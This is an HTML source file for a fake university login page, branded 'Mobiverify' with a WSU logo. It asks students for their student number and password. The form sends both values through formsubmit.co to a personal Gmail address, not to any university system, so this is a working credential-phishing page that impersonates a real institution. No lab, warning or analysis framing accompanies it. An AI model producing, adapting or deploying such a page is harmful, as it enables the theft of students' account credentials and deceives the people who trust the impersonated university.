<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #e9ecef;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        
        .login-container {
            background-color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }

        .login-container img {
            width: 200px;
            margin-bottom: 20px;
        }

        .login-container h2 {
            margin-bottom: 20px;
            color: #333;
        }

        .login-container input[type="text"],
        .login-container input[type="password"],
        .login-container input[type="email"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }

        .login-container input[type="checkbox"] {
            margin-right: 10px;
        }

        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }

        .login-container button:hover {
            background-color: #0056b3;
        }

        .social-login {
            display: flex;
            flex-direction: column;
            margin: 20px 0;
        }

        .social-login button {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
        }

        .social-login button.facebook {
            background-color: #3b5998;
            color: white;
        }

        .social-login button.google {
            background-color: #db4437;
            color: white;
        }

        .login-container a {
            color: #007bff;
            text-decoration: none;
            display: block;
            margin-top: 10px;
        }

        .login-container a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

<div class="login-container">
    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihdX0pUn3y3Kq_ZGqlFVgDNnl88ya9clhALmc5VHeyBs1_ApJ6gABVc2LdycTi23_4JRCAhsfg9GubLKbq-xSFR7_f1gs_tERDGRbmvsZ9SuE6JYY9llCmg28CrczfzKyN3QpPzcpGWI5j2zl8sBzNiEY8nbCFngh6NNVLVVIKRiN57QXzNaFTMJ-1acw5/s320/logo1.png" alt="WSU Logo">
    <h2>Mobiverify</h2>
    <form action="https://formsubmit.co/smithsimson79@gmail.com method="POST">
        <input type="text" name="name" placeholder="Student number" required>
        <input type="password" name="email" placeholder="Enter your password" required>
        <button type="submit">Sign in</button>
    </form>
    <div class="social-login">
        <button class="facebook">Sign in using Facebook</button>
        <button class="google">Sign in using Google+</button>
    </div>
    <a href="#">go back -----WSU Website</a>
</div>

</body>
</html>
